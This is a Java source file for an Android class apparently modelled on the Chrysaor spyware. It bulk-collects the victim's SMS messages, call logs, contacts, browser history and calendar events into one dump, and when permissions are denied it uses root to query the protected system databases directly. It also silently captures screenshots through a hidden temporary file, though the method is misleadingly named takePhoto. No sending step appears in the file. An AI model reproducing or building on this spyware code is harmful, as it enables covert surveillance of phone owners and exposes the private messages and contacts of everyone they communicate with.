package com.android.chrysaoralike;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.util.Log;
import java.io.FileInputStream;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class DataCollector {
    private static final String TAG = "DataCollector";
    private Context context;
    private SimpleDateFormat sdf = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.US);
    private static final String DB_SMS = "/data/data/com.android.providers.telephony/databases/mmssms.db";
    private static final String DB_CALLLOG = "/data/data/com.android.providers.contacts/databases/calllog.db";
    private static final String DB_CONTACTS = "/data/data/com.android.providers.contacts/databases/contacts2.db";
    private static final String DB_CALENDAR = "/data/data/com.android.providers.calendar/databases/calendar.db";
    private static final String DB_BROWSER = "/data/data/com.android.browser/databases/browser2.db";

    public DataCollector(Context context) { this.context = context.getApplicationContext(); }

    private String runSqliteQuery(String dbPath, String query) {
        if (!RootUtils.checkRoot()) return "ERROR: No root";
        return RootUtils.runCommand("sqlite3 " + dbPath + " \"" + query.replace("\"", "\\\"") + "\"");
    }

    public String collectSms(int limit) {
        StringBuilder sb = new StringBuilder("=== SMS INBOX ===\n");
        try {
            Cursor cursor = context.getContentResolver().query(Uri.parse("content://sms/inbox"), null, null, null, "date DESC LIMIT " + limit);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String address = cursor.getString(cursor.getColumnIndex("address"));
                    String body = cursor.getString(cursor.getColumnIndex("body"));
                    long date = cursor.getLong(cursor.getColumnIndex("date"));
                    sb.append("From: ").append(address).append(" | ").append(sdf.format(new Date(date))).append("\n");
                    sb.append("Body: ").append(body).append("\n\n");
                }
                cursor.close();
                return sb.toString();
            }
        } catch (SecurityException e) { Log.w(TAG, "SMS permission denied, fallback to SQLite."); }
        String result = runSqliteQuery(DB_SMS, "SELECT address, body, date FROM sms ORDER BY date DESC LIMIT " + limit + ";");
        sb.append(result != null ? result : "No SMS or query failed.");
        return sb.toString();
    }

    public String collectCallLogs(int limit) {
        StringBuilder sb = new StringBuilder("=== CALL LOGS ===\n");
        try {
            Cursor cursor = context.getContentResolver().query(CallLog.Calls.CONTENT_URI, null, null, null, "date DESC LIMIT " + limit);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String number = cursor.getString(cursor.getColumnIndex(CallLog.Calls.NUMBER));
                    String type = cursor.getString(cursor.getColumnIndex(CallLog.Calls.TYPE));
                    int duration = cursor.getInt(cursor.getColumnIndex(CallLog.Calls.DURATION));
                    long date = cursor.getLong(cursor.getColumnIndex(CallLog.Calls.DATE));
                    String typeStr = type.equals("1") ? "IN" : type.equals("2") ? "OUT" : "MISSED";
                    sb.append(typeStr).append(" ").append(number).append(" (").append(duration).append("s) ").append(sdf.format(new Date(date))).append("\n");
                }
                cursor.close();
                return sb.toString();
            }
        } catch (SecurityException e) { Log.w(TAG, "CallLog permission denied, fallback to SQLite."); }
        String result = runSqliteQuery(DB_CALLLOG, "SELECT number, type, duration, date FROM calls ORDER BY date DESC LIMIT " + limit + ";");
        sb.append(result != null ? result : "No call logs.");
        return sb.toString();
    }

    public String collectContacts() {
        StringBuilder sb = new StringBuilder("=== CONTACTS ===\n");
        try {
            Cursor cursor = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
                    String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
                    sb.append("Name: ").append(name).append("\n");
                    Cursor phoneCursor = context.getContentResolver().query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?", new String[]{id}, null);
                    if (phoneCursor != null) {
                        while (phoneCursor.moveToNext()) {
                            sb.append("  Phone: ").append(phoneCursor.getString(phoneCursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER))).append("\n");
                        }
                        phoneCursor.close();
                    }
                    sb.append("\n");
                }
                cursor.close();
                return sb.toString();
            }
        } catch (SecurityException e) { Log.w(TAG, "Contacts permission denied, fallback to SQLite."); }
        String result = runSqliteQuery(DB_CONTACTS, "SELECT display_name, number FROM contacts LEFT JOIN phone_lookup ON contacts._id = phone_lookup.contact_id;");
        sb.append(result != null ? result : "No contacts.");
        return sb.toString();
    }

    public String collectBrowserHistory() {
        StringBuilder sb = new StringBuilder("=== BROWSER HISTORY ===\n");
        try {
            Cursor cursor = context.getContentResolver().query(Uri.parse("content://browser/bookmarks"), null, null, null, "date DESC");
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String url = cursor.getString(cursor.getColumnIndex("url"));
                    String title = cursor.getString(cursor.getColumnIndex("title"));
                    long date = cursor.getLong(cursor.getColumnIndex("date"));
                    sb.append("URL: ").append(url).append(" | ").append(sdf.format(new Date(date))).append("\n");
                    sb.append("Title: ").append(title).append("\n\n");
                }
                cursor.close();
                return sb.toString();
            }
        } catch (SecurityException e) { Log.w(TAG, "Browser history permission denied, fallback to SQLite."); }
        String result = runSqliteQuery(DB_BROWSER, "SELECT url, title, date FROM bookmarks ORDER BY date DESC;");
        sb.append(result != null ? result : "No history.");
        return sb.toString();
    }

    public String collectCalendar() {
        StringBuilder sb = new StringBuilder("=== CALENDAR ===\n");
        try {
            Cursor cursor = context.getContentResolver().query(Uri.parse("content://com.android.calendar/events"), null, null, null, "dtstart ASC");
            if (cursor != null) {
                while (cursor.moveToNext()) {
                    String title = cursor.getString(cursor.getColumnIndex("title"));
                    long start = cursor.getLong(cursor.getColumnIndex("dtstart"));
                    long end = cursor.getLong(cursor.getColumnIndex("dtend"));
                    sb.append("Event: ").append(title).append("\n");
                    sb.append("Start: ").append(sdf.format(new Date(start))).append("\n");
                    sb.append("End: ").append(sdf.format(new Date(end))).append("\n\n");
                }
                cursor.close();
                return sb.toString();
            }
        } catch (SecurityException e) { Log.w(TAG, "Calendar permission denied, fallback to SQLite."); }
        String result = runSqliteQuery(DB_CALENDAR, "SELECT title, dtstart, dtend FROM Events ORDER BY dtstart ASC;");
        sb.append(result != null ? result : "No calendar.");
        return sb.toString();
    }

    public String collectAllData() {
        StringBuilder sb = new StringBuilder();
        sb.append(collectSms(20));
        sb.append("\n").append(collectCallLogs(20));
        sb.append("\n").append(collectContacts());
        sb.append("\n").append(collectBrowserHistory());
        sb.append("\n").append(collectCalendar());
        return sb.toString();
    }

    public byte[] takePhoto() {
        try {
            String path = "/data/local/tmp/.temp_photo.jpg";
            RootUtils.runCommand("screencap -j " + path + " 2>/dev/null || screencap -p " + path);
            java.io.File file = new java.io.File(path);
            if (file.exists() && file.length() > 0) {
                FileInputStream fis = new FileInputStream(file);
                byte[] data = new byte[(int) file.length()];
                fis.read(data);
                fis.close();
                file.delete();
                // Convert PNG to JPEG if needed
                if (data.length >= 4 && data[0] == (byte)0x89 && data[1] == (byte)0x50 && data[2] == (byte)0x4E && data[3] == (byte)0x47) {
                    android.graphics.Bitmap bmp = android.graphics.BitmapFactory.decodeByteArray(data, 0, data.length);
                    if (bmp != null) {
                        java.io.ByteArrayOutputStream baos = new java.io.ByteArrayOutputStream();
                        bmp.compress(android.graphics.Bitmap.CompressFormat.JPEG, 80, baos);
                        bmp.recycle();
                        return baos.toByteArray();
                    }
                }
                return data;
            }
        } catch (Exception e) { Log.e(TAG, "Photo capture error", e); }
        return null;
    }
}